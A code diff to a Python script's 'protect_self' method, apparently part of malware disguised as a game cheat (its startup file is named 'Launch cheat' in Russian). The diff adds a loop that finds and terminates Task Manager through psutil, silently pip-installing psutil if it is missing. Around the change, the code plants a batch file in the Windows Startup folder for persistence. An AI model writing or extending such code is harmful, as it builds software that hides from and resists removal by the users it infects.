@@ -25,15 +25,26 @@ class a:
     def protect_self(self):
         import subprocess
         import shutil
+        try:
+            import psutil
+        except ImportError:
+            import sys
+            subprocess.call([sys.executable, '-m', 'pip', 'install', 'psutil'])
+            import psutil
         script_dir = os.path.dirname(os.path.abspath(__file__))
         bat_name = 'Запуск чита.bat'
         bat_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bat_name)
         pyw_path = os.path.abspath(__file__)
         while True:
             try:
+                # Закрытие taskmgr через psutil
+                for proc in psutil.process_iter(['name']):
+                    try:
+                        if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
+                            proc.terminate()
+                    except Exception:
+                        pass
                 tasks = subprocess.check_output('tasklist', creationflags=0x08000000).decode(errors='ignore')
-                if 'Taskmgr.exe' in tasks or 'taskmgr.exe' in tasks:
-                    subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 for line in tasks.splitlines():
                     if ('python.exe' in line.lower() or 'pythonw.exe' in line.lower()) and str(os.getpid()) not in line:
                         pass
